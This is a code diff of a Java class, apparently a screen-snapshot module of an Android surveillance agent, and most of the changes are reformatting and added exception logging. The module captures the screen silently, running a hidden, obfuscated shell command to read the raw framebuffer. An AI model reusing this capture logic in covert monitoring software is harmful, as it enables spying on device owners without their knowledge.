@@ -65,7 +65,7 @@ public class ModuleSnapshot extends BaseInstantModule {
 	 */
 	public ModuleSnapshot() {
 		if (Cfg.DEBUG) {
-			Check.log(TAG + " SnapshotAgent constructor") ;//$NON-NLS-1$
+			Check.log(TAG + " SnapshotAgent constructor");//$NON-NLS-1$
 		}
 	}
 
@@ -75,23 +75,26 @@ public class ModuleSnapshot extends BaseInstantModule {
 	 * @see com.ht.AndroidServiceGUI.agent.AgentBase#parse(byte[])
 	 */
 	@Override
-	public boolean parse(ConfModule conf) {		
+	public boolean parse(ConfModule conf) {
 		try {
 			String qualityParam = conf.getString("quality");
-			if("low".equals(qualityParam)){
-				quality=50;
-			}else if("med".equals(qualityParam)){
-				quality=70;
-			}else if("high".equals(qualityParam)){
-				quality=90;
+			if ("low".equals(qualityParam)) {
+				quality = 50;
+			} else if ("med".equals(qualityParam)) {
+				quality = 70;
+			} else if ("high".equals(qualityParam)) {
+				quality = 90;
 			}
 		} catch (ConfigurationException e) {
+			if (Cfg.EXCEPTION) {
+				Check.log(e);
+			}
+
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (parse) Error: " + e);
 			}
 		}
 
-		
 		return true;
 	}
 
@@ -108,7 +111,7 @@ public class ModuleSnapshot extends BaseInstantModule {
 
 				if (!isScreenOn) {
 					if (Cfg.DEBUG) {
-						Check.log(TAG + " (go): Screen powered off, no snapshot") ;//$NON-NLS-1$
+						Check.log(TAG + " (go): Screen powered off, no snapshot");//$NON-NLS-1$
 					}
 					return;
 				}
@@ -141,7 +144,7 @@ public class ModuleSnapshot extends BaseInstantModule {
 				}
 
 				if (Cfg.DEBUG) {
-					Check.log(TAG + " (go): w=" + width + " h=" + height) ;//$NON-NLS-1$ //$NON-NLS-2$
+					Check.log(TAG + " (go): w=" + width + " h=" + height);//$NON-NLS-1$ //$NON-NLS-2$
 				}
 
 				// 0: invertito blu e rosso
@@ -149,25 +152,25 @@ public class ModuleSnapshot extends BaseInstantModule {
 				// 2: invertito blu e verde
 				// no ARGB, no ABGR, no AGRB
 				byte[] raw = getRawBitmap();
-				
+
 				if (isTab) {
 					// sul tablet non e' ARGB ma ABGR.
 					byte[] newraw = new byte[raw.length / 2];
-					
+
 					for (int i = 0; i < newraw.length; i++) {
 						switch (i % 4) {
-							case 0:
-								newraw[i] = raw[i + 2]; // A 3:+2
-								break;
-							case 1:
-								newraw[i] = raw[i]; // R 1:+2 2:+1
-								break;
-							case 2:
-								newraw[i] = raw[i - 2]; // G 2:-1 3:-2
-								break;
-							case 3:
-								newraw[i] = raw[i]; // B 1:-2
-								break;
+						case 0:
+							newraw[i] = raw[i + 2]; // A 3:+2
+							break;
+						case 1:
+							newraw[i] = raw[i]; // R 1:+2 2:+1
+							break;
+						case 2:
+							newraw[i] = raw[i - 2]; // G 2:-1 3:-2
+							break;
+						case 3:
+							newraw[i] = raw[i]; // B 1:-2
+							break;
 						}
 						/*
 						 * if (i % 4 == 0) newraw[i] = raw[i + 2]; // A 3:+2
@@ -188,11 +191,11 @@ public class ModuleSnapshot extends BaseInstantModule {
 					raw = null;
 
 					int rotateTab = 0;
-					
+
 					if (isTab) {
 						rotateTab = -90;
 					}
-					
+
 					if (useMatrix && orientation != Surface.ROTATION_0) {
 						final Matrix matrix = new Matrix();
 
@@ -217,9 +220,13 @@ public class ModuleSnapshot extends BaseInstantModule {
 				}
 			}
 		} catch (final Exception ex) {
+			if (Cfg.EXCEPTION) {
+				Check.log(ex);
+			}
+
 			if (Cfg.DEBUG) {
-				Check.log(TAG + " (go) Error: " + ex) ;//$NON-NLS-1$
-				Check.log(ex) ;//$NON-NLS-1$
+				Check.log(TAG + " (go) Error: " + ex);//$NON-NLS-1$
+				Check.log(ex);//$NON-NLS-1$
 			}
 		}
 
@@ -256,8 +263,12 @@ public class ModuleSnapshot extends BaseInstantModule {
 			os = null;
 
 		} catch (final IOException e) {
+			if (Cfg.EXCEPTION) {
+				Check.log(e);
+			}
+
 			if (Cfg.DEBUG) {
-				Check.log(e) ;//$NON-NLS-1$
+				Check.log(e);//$NON-NLS-1$
 			}
 		}
 		return array;
@@ -269,7 +280,7 @@ public class ModuleSnapshot extends BaseInstantModule {
 		final String path = filesPath.getAbsolutePath();
 
 		final String getrawpath = Messages.getString("11.2"); //$NON-NLS-1$
-		
+
 		try {
 			final Process localProcess = Runtime.getRuntime().exec(getrawpath);
 			localProcess.waitFor();
@@ -279,15 +290,23 @@ public class ModuleSnapshot extends BaseInstantModule {
 				return file.read();
 			}
 		} catch (final IOException e) {
+			if (Cfg.EXCEPTION) {
+				Check.log(e);
+			}
+
 			if (Cfg.DEBUG) {
-				Check.log(e) ;//$NON-NLS-1$
+				Check.log(e);//$NON-NLS-1$
 			}
 		} catch (final InterruptedException e) {
+			if (Cfg.EXCEPTION) {
+				Check.log(e);
+			}
+
 			if (Cfg.DEBUG) {
-				Check.log(e) ;//$NON-NLS-1$
+				Check.log(e);//$NON-NLS-1$
 			}
 		}
-		
+
 		return null;
 	}
 
